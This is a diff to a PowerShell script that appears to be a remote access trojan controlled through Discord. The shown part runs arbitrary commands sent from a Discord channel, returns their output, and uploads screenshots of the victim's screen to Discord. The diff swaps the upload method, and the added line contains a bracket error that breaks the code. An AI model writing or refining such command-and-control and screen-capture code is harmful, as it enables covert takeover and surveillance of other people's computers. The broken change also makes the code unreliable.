@@ -75,9 +75,11 @@ while ($true) {
                 $response = Invoke-Expression -Command "$command 2>&1" | Out-String
                 Send-DiscordMessage -channelID $channel.id -content "Results of `'$command': `n``````$response``````"
             } elseif ($content -eq "ss" -or $content -eq "screenshot") {
+                $webClient = New-Object System.Net.WebClient
+                $webClient.Headers.Add("Authorization", "Bot $TOKEN")
                 $path = Get-Screenshot
                 if ($path) {
-                    Invoke-WebRequest -Uri "$baseUrl/channels/$($channel.id)/messages" -Method Post -Headers @{ "Authorization" = "Bot $TOKEN"; "User-Agent" = "Powershell" } -Form @{ "file" = Get-Item -Path $path; "payload_json" = '{"content": "Screenshot taken"}' }
+                    $webClient.UploadFile("$baseUrl/channels/$($channel.id)/messages", "POST", $path}
                     Remove-Item -Path $path
                 } else {
                     Send-DiscordMessage -channelID $channel.id -content "Failed to take screenshot."
